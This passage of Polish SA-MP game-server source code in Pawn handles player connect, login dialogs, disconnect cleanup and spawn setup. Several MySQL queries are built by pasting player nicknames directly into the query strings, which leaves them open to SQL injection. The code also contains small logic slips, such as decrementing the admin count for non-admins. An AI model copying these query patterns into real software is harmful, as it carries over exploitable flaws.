	RemoveBuildingForPlayer(playerid, 3761, 2797.5156, -2448.3438, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2448.4766, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2425.3516, 14.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2410.2109, 14.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2797.5156, -2410.0781, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3626, 2795.8281, -2394.2422, 14.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2814.2656, -2521.4922, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 5157, 2838.0391, -2532.7734, 17.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 5154, 2838.1406, -2447.8438, 15.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 3724, 2838.1953, -2488.6641, 29.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2814.2656, -2356.5703, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 5155, 2838.0234, -2358.4766, 21.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 3724, 2838.1953, -2407.1406, 29.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2762.7578, -2333.3828, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2804.2422, -2333.3828, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 5158, 2837.7734, -2334.4766, 11.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 4274, 2357.0781, -2387.1953, -4.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 4408, 2357.0781, -2387.1953, -4.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -118.9688, -165.6719, 2.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -130.8203, -160.7656, 2.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -116.6172, -153.6328, 2.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -124.4297, -136.6172, 2.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -108.0234, -114.6563, 2.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -119.0156, -112.8672, 2.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -100.7813, -110.4609, 2.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -123.5156, -106.2266, 2.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, 126.0781, -69.9844, 1.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -137.7813, -18.2031, 2.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -133.3281, -7.3047, 2.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -127.1328, 9.5859, 2.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 3276, -71.8359, 58.8750, 2.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 8501, 2160.2734, 1465.1094, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 8694, 2113.1328, 1465.1094, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 8851, 2086.8125, 1483.2344, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8853, 2107.1875, 1522.5234, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8854, 2161.7578, 1522.5234, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8855, 2181.5781, 1483.2344, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8856, 2107.1875, 1443.9922, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8865, 2215.0859, 1522.5234, 10.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 8930, 2217.7500, 1477.6641, 31.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 8931, 2162.4766, 1403.4375, 14.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 9070, 2111.3203, 1501.1172, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9071, 2158.4219, 1501.1172, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9072, 2113.1328, 1465.1094, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9073, 2158.4219, 1501.1172, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9074, 2111.3203, 1501.1172, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9075, 2160.2734, 1465.1094, 22.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 9170, 2117.1250, 923.4453, 12.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2088.8906, 1439.5938, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2088.8906, 1426.4844, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2099.8125, 1447.9766, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2098.3828, 1384.3203, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2100.9922, 1452.1563, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2116.3594, 1384.3281, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2110.8906, 1447.9766, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2121.7266, 1447.9766, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2121.8359, 1443.2344, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2117.3281, 1452.1563, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1341, 2125.1328, 1442.0781, 10.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2147.6641, 1443.2344, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2147.1563, 1424.7422, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1340, 2144.6406, 1441.9297, 10.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2157.0703, 1452.1563, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 8839, 2162.4766, 1403.4375, 14.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 8840, 2162.7891, 1401.4141, 14.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 8843, 2163.5313, 1444.6172, 9.8594, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2171.8672, 1424.6406, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2169.5781, 1452.1563, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1344, 2178.2188, 1418.8438, 10.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2181.9219, 1443.2344, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1344, 2181.5625, 1418.8438, 10.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2181.9922, 1458.7109, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2236.3594, 1402.1250, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2087.6094, 1463.2500, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2087.6094, 1503.2344, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 8502, 2134.1484, 1483.1172, 21.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2101.5703, 1514.0781, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2117.0547, 1514.0781, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2110.8906, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2099.8125, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2121.7266, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2119.5000, 1522.0781, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2182.0547, 1463.2500, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 8852, 2162.1406, 1483.2500, 10.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 8842, 2217.7500, 1477.6641, 31.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2153.8516, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2161.9219, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2157.5078, 1514.0781, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2169.6797, 1518.1328, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2168.5391, 1514.0781, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 2182.0547, 1503.2344, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 2181.9922, 1500.4375, 10.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2148.9219, 1522.0781, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2180.0781, 1521.4375, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1341, 2175.0859, 1523.4141, 10.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 3516, 2042.5234, 831.0156, 9.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 8828, 2057.3906, 988.3750, 8.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 2057.5703, 1003.9063, 11.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 2057.5703, 1113.0313, 11.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 2057.5703, 1107.8984, 11.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2114.9063, 925.5078, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2109.0469, 925.5078, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2109.0469, 914.7188, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2114.9063, 914.7188, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 9169, 2117.1250, 923.4453, 12.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2120.8203, 925.5078, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3465, 2120.8203, 914.7188, 11.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 9192, 2136.1641, 944.1328, 15.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 7717, 2082.7109, 2171.6016, 14.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2061.5938, 2142.9297, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2039.7656, 2142.9297, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3458, 2047.2031, 2170.0156, 11.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2066.1172, 2199.6719, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 7596, 2082.7109, 2171.6016, 14.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 7598, 2083.6406, 2142.8125, 23.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2083.5078, 2142.9297, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 7608, 2088.1641, 2199.5547, 23.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2088.0313, 2199.6719, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 7597, 2103.2656, 2150.1016, 26.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2105.1797, 2142.9297, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3470, 2101.9766, 2146.5703, 13.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 3447, 2109.7031, 2199.6719, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3513, 2118.0391, 2169.6484, 14.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 10051, -1578.1875, 716.2891, -6.0781, 0.25);

    Skin_User[playerid] = 0;
    CMD_Block[playerid] = false;
	TytulChce[playerid] = true;
	pHealth[playerid] = 0;
    pArmour[playerid] = 0;
	TabSelectedPlayerId[playerid] = -1;
	IdzDo[playerid] = true;
    Server[minigunPlayers] = 0;
	Server[rpgPlayers] = 0;
	Server[oneshootPlayers] = 0;
	Server[jetpackPlayers] = 0;
	Server[sniperPlayers] = 0;
	MaPrivCar[playerid] = false;
	PrivPrzebieg[playerid] = 0.0;
	PrivSpeed[playerid] = 0;
	PrywatnyPojazd[playerid] = -1;
	SelectedPrivCar[playerid] = 0;
	ZespawnowanyPrivCar[playerid] = false;
	Spawned[playerid] = false;
	GetPos[playerid] = false;
    AntiFlood_InitPlayer( playerid );
    vdot[playerid] = false;
    gdot[playerid] = false;
    WarnBlock[playerid] = false;
    WarnSystem[playerid] = 0;
    Invisible[playerid] = false;
    ColorAdmina[playerid] = false;
    Players_Online++;
    p_Hours[playerid] = 0;
    p_Minutes[playerid] = 0;
    p_Secounds[playerid] = 0;
    lowiryby[playerid] = 0;
	pRamp[playerid][0] = 1;
	pRamp[playerid][1] = 0;
	SpecPlayer[playerid] = -1;
	pInFun[playerid] = 0;
	pAFK[playerid] = 0;
    pHouse[playerid] = -1;
	pPrivTele[playerid][0][1] = 0.0;
	pPrivTele[playerid][0][2] = 0.0;
	pPrivTele[playerid][1][1] = 0.0;
	pPrivTele[playerid][1][2] = 0.0;
	pPrivTele[playerid][2][1] = 0.0;
	pPrivTele[playerid][2][2] = 0.0;
	pAntyTele[playerid][0] = -1;
	pAntyTele[playerid][1] = 0;
	Vip[playerid] = false;
	Administrator[playerid] = 0;
	AdministratorLevel[playerid] = 0;
	GivePlayerScore(playerid, 3);

    ID_Skin = CreatePlayerTextDraw(playerid, 512.500, 386.500,"_");
    PlayerTextDrawBackgroundColor(playerid, ID_Skin, 0);
    PlayerTextDrawFont(playerid, ID_Skin, TEXT_DRAW_FONT_MODEL_PREVIEW);
    PlayerTextDrawTextSize(playerid, ID_Skin, 100.000, 50.500);
    TD_Show(playerid,Wybieralka[0]);
    TD_Show(playerid,Wybieralka[1]);
    TD_Show(playerid,Wybieralka[2]);
    TD_Show(playerid,Wybieralka[3]);
    TD_Show(playerid,Wybieralka[4]);
    TD_Show(playerid,Wybieralka[5]);
    TD_Show(playerid,Wybieralka[6]);
    TD_Show(playerid,Wybieralka[7]);
    TD_Show(playerid,Wybieralka[8]);
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
	SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, " ");
    SCM(playerid, 0xFFFFFFFF, ""C_O"ptsDM "C_B""Version" "C_O"skompilowany "C_B""Date" "C_O"godz."C_B" "Godz", "C_O"przez "C_B""Author"");
	new witaj[1000];
	format(witaj,sizeof(witaj),""czat" "C_O"Witaj "C_B"%s "C_O"na "C_B"Polskim TOP Serwerze", pName[playerid]);
    SCM(playerid, 0xFFFFFFFF ,witaj);
    SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Dosta³eœ/aœ "C_B"3 "C_O"exp za wejœcie na serwer!");
    SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Jesteœ naszym sta³ym graczem? Dodaj przed nick TAG "C_O"[TOP] "C_B"np. "C_B"[TOP].Olaa");
    SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Zapraszamy na nasze forum "C_B"www.TOP.xaa.pl");
    SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Wiêcej informacji znajdziesz pod "C_B"/CMD");


	format(strx, sizeof strx, "SELECT * FROM `players` WHERE `nick` = '%s'", pName[playerid]);
	mysql_query(strx);
	mysql_store_result();

	if(!mysql_num_rows())
	{
        PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		Dialog(playerid, 0, DIALOG_INPUT, ""C_O"Widzê, ¿e nie zd¹rzy³eœ jeszcze do³¹czyæ do naszej spo³ecznoœci!\n\n"C_O"Korzyœci z zak³adania konta:\n\n\t"C_O"• "C_B"zapisywanie statystyk\n\t"C_O"• "C_B"dodatkowe opcje\n\t"C_O"• "C_B"mo¿liwoœæ zostania vip'em\n\t"C_O"• "C_B"mo¿liwoœæ wygenerowania w³asnej sygnatury\n\n"C_O"Wpisz has³o ni¿ej aby za³o¿yæ konto natychmiastowo!", "Zarejestruj!", "WyjdŸ");
    }
    else
    {
       PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
       Dialog(playerid, 1, DIALOG_PASS, ""C_O"Witaj na "C_B"Polskim TOP Serwerze\n\n"C_O"Konto zosta³o wykryte w naszej\n\t"C_B"bazie danych\n"C_O"Aby rozpocz¹æ grê musisz siê zalogowaæ\naby to zrobiæ, podaj has³o poni¿ej:", "Zaloguj", "WyjdŸ");
	}
	mysql_free_result();

	format(strx, sizeof strx, "Connect: %s (%d)", pName[playerid], playerid);
	WriteLog(strx);
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(GetPVarInt(playerid, "Logged") == 1)
	{
    	switch(reason)
    	{
  			case 0: format(strx, sizeof(strx), ""czat" "C_B"%s"C_O" opuœci³ serwer. "C_B"|Crash| "C_O"(Gra³: "C_B"%d godz %d min %d sek)", pName[playerid], p_Hours[playerid], p_Minutes[playerid], p_Secounds[playerid]);
  			case 1: format(strx, sizeof(strx), ""czat" "C_B"%s"C_O" opuœci³ serwer. "C_B"|Wyszed³| "C_O"(Gra³: "C_B"%d godz %d min %d sek)", pName[playerid], p_Hours[playerid], p_Minutes[playerid], p_Secounds[playerid]);
  			case 2: format(strx, sizeof(strx), ""czat" "C_B"%s"C_O" opuœci³ serwer. "C_B"|Kick/Ban| "C_O"(Gra³: "C_B"%d godz %d min %d sek)", pName[playerid], p_Hours[playerid], p_Minutes[playerid], p_Secounds[playerid]);
  		}
		SCMToAll(-1, strx);

		format(strx, sizeof strx, "UPDATE `players` SET `timeplay` = `timeplay` + '%d' WHERE `nick`='%s'", floatround((GetTickCount() - GetPVarInt(playerid, "timePlay"))/60000), pName[playerid]);
		mysql_query(strx);
	}

	format(strx, sizeof strx, "Disconnect: %s (%d) Reason: %d", pName[playerid], playerid, reason);
	WriteLog(strx);
    Players_Online--;

    if(Administrator[playerid] < 1)
    {
                 Admins_Online--;
    }

    if(Vip[playerid])
    {
                Vips_Online--;
    }

	pLoop(i)
	{
		if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_SPECTATING && SpecPlayer[i] == playerid)
		{
			StopSpec(i);
		}
	}

	ExitDM(playerid);
    if(Player[playerid][rpg])
	{
	    Server[rpgPlayers]--;
	    Player[playerid][rpg] = false;
	}
	if(Player[playerid][minigun])
	{
	    Server[minigunPlayers]--;
	    Player[playerid][minigun] = false;
	}
	if(Player[playerid][oneshoot])
	{
	    Server[oneshootPlayers]--;
	    Player[playerid][oneshoot] = false;
	}
    if(Player[playerid][jetpack])
	{
 	   Server[jetpackPlayers]--;
 	   Player[playerid][jetpack] = false;
	}
	if(Player[playerid][sniper])
	{
 	   Server[sniperPlayers]--;
 	   Player[playerid][sniper] = false;
	}
	if(Player[playerid][jetpack])
	{
 	   Server[jetpackPlayers]--;
 	   Player[playerid][jetpack] = false;
	}

	Player[playerid][Arena] = false;
    if(MaPrivCar[playerid] == true)
	  {
		  mysql_PlayerSet(pName[playerid], "przebieg", tostr(floatval(PrivPrzebieg[playerid])));
		  if( PrywatnyPojazd[playerid] > 0)
		  {
			 PrivCar[PrywatnyPojazd[playerid]] = -1;
			 Delete3DTextLabel(PrywatnyPojazdLabel[playerid]);
			 DestroyVehicle(PrywatnyPojazd[playerid]);
		}
	}
	if(GetPVarInt(playerid, "Walczy") == 1)
	{
		new i = GetPVarInt(playerid, "pWalka");
		if(i != -1)
		{
			GivePlayerScore(playerid, (GetPVarInt(playerid, "pDExp") * -1 )+ 1);

			pInFun[i] = 0;
			SetPlayerVirtualWorld(i, 0);
			GivePlayerScore(i, GetPVarInt(playerid, "pDExp") - 2);
	       	SetPVarInt(i, "pWalka", -1);
			SetPVarInt(i, "pDWeap1", 0);
			SetPVarInt(i, "pDWeap2", 0);
			SetPVarInt(i, "Walczy", 0);
			SetPVarInt(i, "pDExp", 0);
			ResetPlayerWeapons(i);
		    SetPlayerHealth(i, 100.0);
			Odstaw(i);
			SCM(i, -1, "Wygra³eœ pojedynek!");

			format(strx, sizeof strx, "UPDATE `players` SET `winpvp` = `winpvp`+1 WHERE `nick` = '%s'", pName[i]);
			mysql_query(strx);
			format(strx, sizeof strx, "UPDATE `players` SET `lospvp` = `lospvp`+1 WHERE `nick` = '%s'", pName[playerid]);
			mysql_query(strx);
		}
	}

	Spawned[playerid] = false;
	GetPos[playerid] = false;
	if(pAntyTele[playerid][0] != -1)
	{
		if(pAntyTele[pAntyTele[playerid][0]][0] == playerid)
		{
		    pAntyTele[pAntyTele[playerid][0]][0] = -1;
		}
	}


 	if(GetPVarInt(playerid, "pZapisanyWG") == 1)
	{
		WG_Team[GetPlayerTeam(playerid) - 10]--;
		if(WG_Team[GetPlayerTeam(playerid) - 10] <= 0)
		{
			KillTimer(WG_Timer);
			WG_End();
		}
	}
	if(GetPVarInt(playerid, "pZapisanyCH") == 1)
	{
		CH_Zapisanych--;
		if(CH_Szukajacy == playerid && CH_Trwa == 1)
		{
		    KillTimer(CH_Timer);
		    CH_End();
		}else if(CH_Zapisanych <= 1 && CH_Trwa == 1)
		{
		    KillTimer(CH_Timer);
		    CH_End();
		}
	}
	if(GetPVarInt(playerid, "pZapisanyHay") == 1)
	{
	    if(pInFun[playerid] == 1 && HAY_Trwa) Iter_Remove(HAY_Array, playerid);

		HAY_Zapisanych--;

		if(HAY_Zapisanych <= 1 && HAY_Trwa)
		{
		    KillTimer(HAY_Timer);
		    HAY_Trwa = 0;
			HAY_Timer = -1;
			HAY_Zapisanych = 0;
			HAY_Odliczanie = -1;
			Iter_Clear(HAY_Array);

			pLoop(i)
			{
			    if(IsPlayerConnected(i) == 1 && pInFun[i] == 1 && GetPVarInt(i, "pZapisanyHay") && i != playerid)
			    {
			        Odstaw(i);
					GivePlayerScore(i, 15);
					GivePlayerMoney(i, 15000);
					pInFun[i] = 0;
					SetPVarInt(i, "pZapisanyHAY", 0);
					SCM(i, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Hay! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
					break;
			    }
			}
		}
	}
	if(GetPVarInt(playerid, "pZapisanySS") == 1) SS_Zapisanych--;
	if(GetPVarInt(playerid, "pZapisanyTW") == 1) TW_Zapisanych--;

	if(GetPVarInt(playerid, "pZapisanyDD") == 1)
	{
		DD_Zapisanych--;
		if(DD_Zapisanych <= 1 && DD_Trwa)
		{
		    KillTimer(DD_Timer);
		    DD_Trwa = 0;
			DD_Timer = -1;
			DD_Zapisanych = 0;
			DD_Odliczanie = -1;

			pLoop(i)
			{
			    if(IsPlayerConnected(i) == 1 && pInFun[i] == 1 && GetPVarInt(i, "pZapisanyDD") && i != playerid)
			    {
			        Odstaw(i);
					GivePlayerScore(i, 15);
					GivePlayerMoney(i, 15000);
					pInFun[i] = 0;
					SetPVarInt(i, "pZapisanyDD", 0);
					SCM(i, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Derby! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
					break;
			    }
			}
		}
	}
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid)
{
	if(IsPlayerInDM(playerid) && GetPVarInt(playerid, "pDM") == 3 && weaponid == 24)
	{
	    KillPlayer(playerid);
	}
	if(issuerid != INVALID_PLAYER_ID
		&& PlayerPlaySound(issuerid, 6401, 0, 0, 0)
		&& IsPlayerInAnyVehicle(issuerid) == 0
		&& IsPlayerInAnyVehicle(playerid) == 0)
	{
		if(GetPlayerTeam(playerid) == NO_TEAM || GetPlayerTeam(playerid) != GetPlayerTeam(issuerid))
		{
	    	pAntyTele[playerid][0] = issuerid;
	    	pAntyTele[issuerid][0] = playerid;
	    	pAntyTele[playerid][1] = GetTickCount();
	    	pAntyTele[issuerid][1] = GetTickCount();
		}
		return 1;
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(GetPVarInt(playerid, "ShowNickOff") == 1 || GetPVarInt(playerid, "rec") == 1)
	{
		ShowPlayerNameTagForPlayer(playerid, forplayerid, 0);
	}
	return 1;
}
public OnPlayerSpawn(playerid)
{
    AntiDeAMX();
	if(GetPVarInt(playerid, "Logged") == 0)
	    return KickPlayer(playerid, "System", "Spawn bez zalogowania");

	if(GetPVarInt(playerid, "pDM") != 0)
	{
	    DeathMatch(playerid, GetPVarInt(playerid, "pDM") - 1);
	    return 1;
	}
	if(GetPVarInt(playerid, "pJailed") == 1)
	{
		JailPlayer(playerid, "Valdrigar", ""C_O"Próba ucieczki z wiêzienia.");
	    return 1;
	}
    GiveStandartWeapon(playerid);
	if(GetPVarInt(playerid, "floInt") != 0)
	{
	    SetPlayerPos(playerid,
		    GetPVarFloat(playerid, "floX"),
		    GetPVarFloat(playerid, "floY"),
		    GetPVarFloat(playerid, "floZ"));

	    SetPVarInt(playerid, "floInt", 0);
	    SetPlayerVirtualWorld(playerid, 0);
	    return 1;
	}
	GangZoneShowForPlayer(playerid, WojskoZone, 0xFF000080);
	PlayerTextDrawSetPreviewModel(playerid, ID_Skin, GetPlayerSkin(playerid));
    TD_Show(playerid, Logo);
    TD_Show(playerid, Reklama);
    TD_Show(playerid, StatyBox[0]);
	TD_Show(playerid, StatyBox[1]);
	TD_Show(playerid, StatyBox[2]);
	TD_Show(playerid, StatyBox[3]);
	TD_Show(playerid, StatyBox[4]);
	TD_Show(playerid, StatyBox[5]);
	TD_Show(playerid, StatyBox[6]);
	TD_Show(playerid, NazwaMapy);
	TD_Show(playerid, www_top);
	TD_Show(playerid, DataDraw);
	TD_Show(playerid, TD_Nick[playerid]);
	TD_Show(playerid, TD_Exp[playerid]);
	TD_Show(playerid, TD_Level[playerid]);
	TD_Show(playerid, TD_Online[playerid]);
	TD_Show(playerid, TD_FPS[playerid]);
	TD_Show(playerid, TD_Ping[playerid]);
	TD_Show(playerid, TD_Gang[playerid]);
	TD_Show(playerid, Graczy[playerid]);
	TD_Show(playerid, FunDrawBox[0]);
	TD_Show(playerid, FunDrawBox[1]);
    TD_Show(playerid, FunDraw[0]);
    TD_Show(playerid, FunDraw[1]);
    TD_Show(playerid, FunDraw[2]);
 	TD_Show(playerid, FunDraw[3]);
    TD_Show(playerid, FunDraw[4]);
    TD_Show(playerid, FunDraw[5]);
    TD_Show(playerid, Zegar[0]);
    TD_Show(playerid, Zegar[1]);
    TD_Show(playerid, TDArenki[0]);
    TD_Show(playerid, TDArenki[1]);
    TD_Show(playerid, TDArenki[2]);
    TD_Show(playerid, TDArenki[3]);
    TD_Show(playerid, TDArenki[4]);
    TD_Show(playerid, TDPolecamy);
	TD_Show(playerid, ZegarDraw);
	TD_Hide(playerid,Wybieralka[0]);
    TD_Hide(playerid,Wybieralka[1]);
    TD_Hide(playerid,Wybieralka[2]);
    TD_Hide(playerid,Wybieralka[3]);
    TD_Hide(playerid,Wybieralka[4]);
    TD_Hide(playerid,Wybieralka[5]);
    TD_Hide(playerid,Wybieralka[6]);
    TD_Hide(playerid,Wybieralka[7]);
    TD_Hide(playerid,Wybieralka[8]);
    PlayerTextDrawShow(playerid, ID_Skin);

	SetPVarInt(playerid, "rec", 0);

	SetPlayerTime(playerid, hour, minute);
	SetPlayerColor(playerid, playerColors[playerid]);

	if(walizka[2] == 1)
	{
	    TD_Show(playerid, WalizkaDraw[1]);
	    TextDrawShowForAll(WalizkaDraw[0]);
	}
	if(GetOnlinePlayers() > OnlineRekord)
	{
	   OnlineRekord = GetOnlinePlayers();
	   format(strx, sizeof strx, "UPDATE `stats` SET `value` = '%d' WHERE `name` = 'rekord'", OnlineRekord);
	   new string[1000];
	   PlayerPlaySound(playerid,1138,0.0,0.0,0.0);
	   format(string,sizeof(string), "~g~Nowy rekord graczy!~n~~r~%d", OnlineRekord);
       GameTextForAll(string, 5000, 3);
	   SetTimer("RekordHide", 5000, true);
	   mysql_query(strx);
    }
    StopAudioStreamForPlayer(playerid);
    Spawned[playerid] = true;
	mysql_query("SELECT `x`,`y`,`z` FROM `spawn` WHERE `world` = 0 AND `interior` = 0 ORDER BY RAND() LIMIT 1");
	mysql_store_result();

	static X[12],Y[12],Z[12];
    mysql_fetch_field("x", X);
    mysql_fetch_field("y", Y);
    mysql_fetch_field("z", Z);
    mysql_free_result();
    ShowPlayerDialog(playerid, 125, DIALOG_STYLE_MSGBOX, ""DIALOG_T" {000000}| {00FF59}Zmiana koloru", "Zosta³eœ zrespawnowany, czy chcesz zmieniæ swój kolor?\n", "Tak", "Nie");
    Audio_PlayStreamed(playerid, "http://top.xaa.pl/ptsdm/spawned/_spawn_.mp3");
